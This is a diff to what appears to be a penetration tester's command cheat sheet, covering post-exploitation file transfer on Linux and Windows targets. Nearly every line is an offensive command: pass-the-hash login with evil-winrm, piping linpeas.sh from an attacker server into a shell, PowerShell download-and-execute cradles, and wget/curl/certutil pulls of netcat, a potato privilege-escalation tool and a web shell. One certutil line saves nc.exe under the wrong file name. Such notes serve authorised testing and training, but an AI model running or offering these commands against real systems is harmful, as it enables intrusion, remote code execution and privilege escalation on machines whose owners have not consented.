@@ -760,6 +760,7 @@ evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 # Post-Exploitation 
 ## Linux
 [*] File Transfer
+scp -r ~/Upload $USERNAME@$TARGET:/Upload
 scp ~/Upload/linux/* $USERNAME@$TARGET:
 wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
 curl http://$MYIP:8888/linux/linpeas.sh | sh
@@ -856,11 +857,14 @@ reset
 
 ## Windows
 [*] File Transfer
++---------- To Disk ----------+
+wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
+certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\EfsPotato.exe
+
++---------- In Memory ----------+
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1'); dir C:\programdata\tmp"
 set cmd powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1');"
-wget http://$MYIP:8888/shell.aspx -o shell.aspx
-curl http://$MYIP:8888/shell.aspx -o shell.aspx
-certutil -urlcache -f http://$MYIP:8888/shell.aspx shell.aspx
 
 [*] Shells
 +---------- One Liners ----------+
